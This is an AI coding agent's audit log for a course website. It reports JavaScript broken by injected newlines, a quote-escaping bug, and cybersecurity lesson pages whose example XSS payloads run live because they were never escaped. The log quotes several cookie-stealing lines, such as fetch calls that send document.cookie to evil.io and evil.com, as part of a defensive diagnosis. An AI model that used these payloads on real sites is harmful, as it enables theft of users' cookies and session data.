# Auditing a brain dump: what was measurable, and what is still a decision

Date: 2026-09-03
Agent: Claude Code (session: CEO agent setup)
Boards filed: 172, 173, 174, 175, 176
Instrument added: `tools/scan-inline-scripts.py`

Tanner listed roughly fifteen things in one message and asked for analysis
rather than action. Most of them were checkable. This note records what the
measurements said, which of my own instruments lied first, and which items are
product decisions that no measurement settles.

## Two live defects, both proven in a browser

### CSA 1.9 serves a page where nothing works

Two stray newlines were injected into the page body INSIDE JavaScript tokens.

    the Java editor block   re \n turn '';        a hard SyntaxError
    the MCQ block           opt.getAtt \n ribute(...)   an ASI split

The first kills the whole block, so `CodeMirror.fromTextArea` never runs and the
page renders ZERO editors despite having its problems authored. That is why the
lesson looked to Tanner like it "didn't have Java editor problems".

The second is worse because it PARSES. Automatic Semicolon Insertion turns it
into `opt.getAtt;` followed by `ribute('data-letter');`, so `node --check` is
green and every static check passes. It throws `ReferenceError: ribute is not
defined` on the first option, AFTER the handler has already set
`ex.dataset.answered`. Measured in Chromium against the live bytes: options
graded 0, feedback shown false, button still enabled, and the question locked on
the student's first pick with no feedback ever.

Unit 1 is the free preview unit and this is the first week of school.

**The repair is a deletion.** The MCQ block on 1.9 is 1339 bytes; on lesson 1.8
it is 1338 and byte-identical apart from that one newline. The correct bytes are
recoverable from a sibling as CONVENTION (this block is pure boilerplate and
holds no question data), which is the one use a near-twin is allowed for.

### The corruption is systemic, and 1.9 is just where it landed badly

Comparing that same boilerplate block across the 47 CSA lesson pages that carry
it: 3 pages differ from the modal version by exactly one injected whitespace
character.

    1.7   if (!chosen \n || ex.dataset.answered)      harmless, legal whitespace
    4.1   forEach(function(ex) \n {                   harmless, legal whitespace
    1.9   opt.getAtt \n ribute(...)                   breaks the page

Two more injections sit in 1.9's editor block and its CSS
(`.CodeMirror- \n scroll`, `!importan \n t`). Whether an injection breaks
anything is luck. The cause is NOT identified and it will recur.

### A CSP practice page serves a dead widget

`ap-csp-filtering-sorting-practice` defines `var FS_QUESTIONS = [...]` with
UNESCAPED double quotes inside the option strings:

    "(evType = "workshop") AND (cost <= 25) AND (seats >= 1)"

The array is invalid, the block fails to parse, and `FS_QUESTIONS` is NOT
DEFINED at runtime. Nothing is scored. The generator escaped angle brackets as
`<` and stopped one character short of the quotes, so this is an escaping
bug rather than an absent convention: `lib/csa-exercise-pages.js` already states
the rule it breaks.

Unlike 1.9 this one is NOT a repair. Recovering it means knowing what the option
text was meant to say, which is authoring.

## The instruments that lied first, which is the part worth keeping

Four times in one session a naive read of page handles nearly produced a false
finding, and going through `utils.pageFromHandle` is what stopped it every time.

1. **`[a-z-]+$` excluded any slug containing a digit.** Reported CSA 4.11, 4.12
   and 4.13 as having no lesson page. All three exist:
   `ap-csa-lesson-4-11-2d-array-creation-and-access`. The `2d` did it.
2. **The same regex silently dropped every `exercise-1` page**, because those
   end in a digit. A 150-page scan that I described as covering CSA lessons was
   covering lesson, debug and frq only.
3. **CSP Big Idea 3 read as 18 of 18 lessons missing `exercise-1`.** A perfectly
   uniform gap, which this repo has learned to distrust. The pages exist under
   the OTHER scheme the resolver knows, `ap-csp-topic-3-N-exercise-1`, 70 of
   them, deliberately routed as a visit on the parent topic so that opening one
   does not mark it complete.
4. **Cyber Units 3, 4 and 5 read as having no lesson pages at all.** They are on
   the `ap-cyber-unit-N-lesson-M` scheme rather than the `ap-cybersecurity-unit-N-slug`
   one. Resolved through `pageFromHandle`, all 26 cyber lessons have all five
   activity types. Cyber content is structurally COMPLETE.

Every one of these is the failure CLAUDE.md names. The rule held: find the
function whose job is to resolve the naming, and go through it.

A fifth, in my own driver: my first Playwright assertion for "can the student
change their answer" checked whether ANY option was still selected, which is
true either way because the first pick stays selected. It reported YES on a
question that is in fact locked. Rewritten to report WHICH option.

## What the measurements say about the rest of the list

- **CSA is complete** except Unit 1's 15 Exercise 2s. 250 pages, 53 lessons
  times 5 types minus 15. Exactly board 162, no new gaps.
- **CSA Exercise 1s are drills, and Unit 1's are uniformly so.** All 15 Unit 1
  references are straight-line: no `if`, no `for`, no `while`. That is partly
  forced, because the CED puts selection and iteration in Unit 2. But branchless
  does not have to mean situationless, and 6 of the 15 are named after the
  language feature rather than a scenario.
- **The infrastructure for bigger problems already exists.**
  `lib/csa-code-modes.js` has a `driver` mode, "student writes the class, a
  hidden harness exercises it", used by all 9 Unit 3 exercises. The constraint on
  bigger exercises is authoring, not architecture.
- **CSA Exercise 2 is currently multiple choice**, 6 questions per lesson, 228
  authored. Turning it into the bigger coding problem is a change of KIND with a
  denominator knock-on, not a content top-up.
- **The sandbox already does multi-class Java and Create Task languages.** It
  cannot become the graded path without merging the one PII exception with
  graded code, which CLAUDE.md forbids in terms.
- **Locking assessments is a migration, not a toggle.** 5 of 125 assessments are
  served by the API; the other 120 carry their questions and keys in the page
  body, where `lib/activity-gate.js` says plainly that a lock is theatre.
- **Cyber has 2 videos, not a library.** One real, one an un-actioned
  `REPLACE_WITH_VIDEO_EMBED_URL` comment block on Topic 1.2 that also reveals the
  slides slot was never filled. Only 2 of 653 crawled pages carry that
  scaffolding.
- **Cyber slides cover Units 1 and 2 only**, 9 of 26 lessons. CSP is complete at
  35 of 35 lessons and 224 decks.
- **Cyber has zero by-topic practice tests.** CSA has 14, CSP has 10. That is the
  structure Tanner says carried the site last spring, and it is the one shape
  cyber does not have.

## The one that was not on his list

Scanning all 730 crawled pages with `tools/scan-inline-scripts.py` found **7
pages whose inline scripts a browser cannot parse**, confirmed by loading each in
Chromium. Five are AP Cybersecurity Unit 5, which is the content Tanner wants
mature for spring.

The cause on those five is not an injected newline. The lesson pages show
example attack payloads inside `<code>` blocks and the example `<script>` tags
were never escaped to `&lt;script&gt;`. There are ZERO escaped ones on these
pages. So the HTML parser builds REAL script elements and the browser runs them:

    ap-cyber-unit-5-lesson-6             document.write(document.cookie)
    ap-cyber-unit-5-lesson-6             fetch('evil.io/c?'+document.cookie)
    ap-cyber-unit-5-lesson-1-exercise-1  fetch('evil.com/c='+document.cookie)
    ap-cyber-unit-5-exam                 stealCookies()   undefined, throws

Four more payloads throw because they are URL encoded.

Severity, stated rather than implied: `apcse_token` is in localStorage and the
Shopify session cookie is HttpOnly, so neither is reachable from
`document.cookie`. What does leave are the Shopify analytics and cart
identifiers, to two domains this business does not own and anyone can register.
`document.write` also corrupts the surrounding lesson, which is why those pages
throw further errors and why the examples a student is meant to READ are missing.

Filed as board 177. The repair is escaping, and it belongs to a human because
recovering each example means knowing what it was meant to display.

My own labelling was wrong first here too. A regex called
`fetch('evil.io/c?'+document.cookie)` inert because `+document` looked like URL
encoding. It is ordinary string concatenation and the browser runs it. Parsing
each payload with `vm.Script` instead of pattern matching moved the count of
executing payloads from 1 to 4.

### The scan was re-derived, and the two agree exactly

The finding above rests on one instrument, so it was reached a second time by a
different one. Two implementations, different languages, different mechanisms:

    tools/scan-inline-scripts.py   Python, one `node --check` SUBPROCESS per
                                   block, plus a regex for the ASI signature
    the cross-check                one Node process, `new vm.Script()` in
                                   process, no subprocess and no regex

Same 7 pages, same 13 faults, block for block:

    ap-csa-lesson-1-9-method-signatures      2   1 SYNTAX + 1 ASI
    ap-csp-filtering-sorting-practice        1
    ap-cyber-unit-5-lesson-4                 1
    ap-cyber-unit-5-lesson-5                 1
    ap-cyber-unit-5-lesson-5-exercise-1      1
    ap-cyber-unit-5-lesson-6                 5
    ap-cybersecurity-xss                     2
                                            13

The first full Python run reported 11 across 666 pages and the Node run reported
13 across 730. That is not a disagreement: the Python run was launched while the
crawl was still going and never saw `ap-cybersecurity-xss`, which carries exactly
2. 11 + 2 = 13. Reconciled by arithmetic rather than by assuming.

Worth stating because the in-process check is roughly 400 times faster: the
Python run took about forty minutes over 666 pages, the Node run seconds over
730. If this becomes a nightly sweep it should be the Node one, with the Python
one kept as the thing that proves it.

## What no measurement settles, and why I stopped

Four of these are product decisions and I did not pick one:

1. Whether Exercise 2 becomes a coding problem or stays multiple choice.
2. Whether to fund the 120-assessment migration onto the server render path,
   and in what order, given that locking is worthless without it.
3. Whether the cyber practice exam gains a 60 MCQ plus 1 FRQ replica beside the
   40 plus 3 study set, which already discloses the real format.
4. What replaces the day budget removed from the cyber pacing strip, still open
   from board 168.
